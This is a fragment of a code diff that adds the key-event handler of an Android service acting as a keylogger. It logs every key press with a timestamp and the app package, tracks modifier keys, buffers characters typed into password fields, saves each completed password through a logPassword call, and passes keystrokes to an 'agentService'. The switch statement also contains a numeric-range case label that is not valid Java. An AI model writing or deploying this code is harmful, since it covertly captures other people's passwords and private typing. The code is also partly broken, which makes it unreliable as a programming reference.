+                .append(getFullTimestamp())
+                .append(" ===\n");
+        }
+        Log.d(TAG, "🗑️ Logs cleared");
+    }
+
+    // ==================== KEY EVENT HANDLER ====================
+
+    @Override
+    protected boolean onKeyEvent(KeyEvent event) {
+        if (!isKeyloggingEnabled.get()) {
+            return super.onKeyEvent(event);
+        }
+
+        try {
+            int action = event.getAction();
+            int keyCode = event.getKeyCode();
+            
+            // Track modifier keys
+            if (keyCode == KeyEvent.KEYCODE_SHIFT_LEFT || keyCode == KeyEvent.KEYCODE_SHIFT_RIGHT) {
+                isShiftPressed = (action == KeyEvent.ACTION_DOWN);
+            }
+            if (keyCode == KeyEvent.KEYCODE_CTRL_LEFT || keyCode == KeyEvent.KEYCODE_CTRL_RIGHT) {
+                isCtrlPressed = (action == KeyEvent.ACTION_DOWN);
+            }
+            if (keyCode == KeyEvent.KEYCODE_ALT_LEFT || keyCode == KeyEvent.KEYCODE_ALT_RIGHT) {
+                isAltPressed = (action == KeyEvent.ACTION_DOWN);
+            }
+            if (keyCode == KeyEvent.KEYCODE_META_LEFT || keyCode == KeyEvent.KEYCODE_META_RIGHT) {
+                isMetaPressed = (action == KeyEvent.ACTION_DOWN);
+            }
+            
+            // Only log key down events
+            if (action == KeyEvent.ACTION_DOWN) {
+                String keyChar = getKeyChar(keyCode, event);
+                if (keyChar != null) {
+                    // If password field is active, capture keystroke
+                    if (isPasswordField) {
+                        if (!keyChar.equals("[ENTER]\n") && !keyChar.equals("[BACKSPACE]") &&
+                            !keyChar.equals("[TAB]") && !keyChar.equals("[LEFT]") &&
+                            !keyChar.equals("[RIGHT]") && !keyChar.equals("[UP]") &&
+                            !keyChar.equals("[DOWN]")) {
+                            passwordBuffer.append(keyChar);
+                            lastPasswordInputTime = System.currentTimeMillis();
+                        } else if (keyChar.equals("[BACKSPACE]") && passwordBuffer.length() > 0) {
+                            passwordBuffer.deleteCharAt(passwordBuffer.length() - 1);
+                        } else if (keyChar.equals("[ENTER]\n")) {
+                            // Password complete
+                            String password = passwordBuffer.toString().trim();
+                            if (password.length() >= 4) {
+                                logPassword(lastPackageName, currentAppName, password);
+                                passwordBuffer.setLength(0);
+                                isPasswordField = false;
+                            }
+                        }
+                    }
+                    
+                    String packageName = lastPackageName.isEmpty() ? "system" : lastPackageName;
+                    String logEntry = String.format(
+                        "[%s] %s - [KEY:%s] %s\n",
+                        getCurrentTimestamp(),
+                        packageName,
+                        keyCode,
+                        keyChar
+                    );
+                    appendToBuffer(logEntry);
+                    
+                    if (agentService != null) {
+                        agentService.onKeyLogged(keyChar);
+                    }
+                }
+            }
+            
+        } catch (Exception e) {
+            Log.e(TAG, "Key event error: " + e.getMessage());
+        }
+
+        return super.onKeyEvent(event);
+    }
+
+    private String getKeyChar(int keyCode, KeyEvent event) {
+        int unicode = event.getUnicodeChar();
+        if (unicode > 0) {
+            char c = (char) unicode;
+            if (Character.isDefined(c) && !Character.isISOControl(c)) {
+                return String.valueOf(c);
+            }
+        }
+        
+        switch (keyCode) {
+            case KeyEvent.KEYCODE_ENTER:
+                return "[ENTER]\n";
+            case KeyEvent.KEYCODE_DEL:
+                return "[BACKSPACE]";
+            case KeyEvent.KEYCODE_TAB:
+                return "[TAB]";
+            case KeyEvent.KEYCODE_DPAD_LEFT:
+                return "[LEFT]";
+            case KeyEvent.KEYCODE_DPAD_RIGHT:
+                return "[RIGHT]";
+            case KeyEvent.KEYCODE_DPAD_UP:
+                return "[UP]";
+            case KeyEvent.KEYCODE_DPAD_DOWN:
+                return "[DOWN]";
+            case KeyEvent.KEYCODE_MENU:
+                return "[MENU]";
+            case KeyEvent.KEYCODE_BACK:
+                return "[BACK]";
+            case KeyEvent.KEYCODE_HOME:
+                return "[HOME]";
+            case KeyEvent.KEYCODE_SEARCH:
+                return "[SEARCH]";
+            case KeyEvent.KEYCODE_VOLUME_UP:
+                return "[VOLUME_UP]";
+            case KeyEvent.KEYCODE_VOLUME_DOWN:
+                return "[VOLUME_DOWN]";
+            case KeyEvent.KEYCODE_CAMERA:
+                return "[CAMERA]";
+            case KeyEvent.KEYCODE_POWER:
+                return "[POWER]";
+            case KeyEvent.KEYCODE_ESCAPE:
+                return "[ESC]";
+            case KeyEvent.KEYCODE_FORWARD_DEL:
+                return "[DELETE]";
+            case KeyEvent.KEYCODE_INSERT:
+                return "[INSERT]";
+            case KeyEvent.KEYCODE_PAGE_UP:
+                return "[PAGE_UP]";
+            case KeyEvent.KEYCODE_PAGE_DOWN:
+                return "[PAGE_DOWN]";
+            case KeyEvent.KEYCODE_MOVE_END:
+                return "[END]";
+            case KeyEvent.KEYCODE_MOVE_HOME:
+                return "[HOME_KEY]";
+            case KeyEvent.KEYCODE_NUMPAD_0...KeyEvent.KEYCODE_NUMPAD_9:
+                return "[" + (keyCode - KeyEvent.KEYCODE_NUMPAD_0) + "]";
+            default:
+                String key = KEY_MAP.get(keyCode);
+                if (key != null) {
+                    if (isShiftPressed || isCapsLockOn) {
+                        String shifted = SHIFT_KEY_MAP.get(keyCode);
+                        if (shifted != null) {
+                            return shifted;
+                        }
+                    }
+                    return key;
+                }
+                return null;
+        }
+    }
+
+    // ==================== ON CONFIGURATION CHANGED ====================
+
+    @Override
+    public void onConfigurationChanged(android.content.res.Configuration newConfig) {
+        super.onConfigurationChanged(newConfig);
+        Log.d(TAG, "⚙️ Configuration changed");
+    }
+}
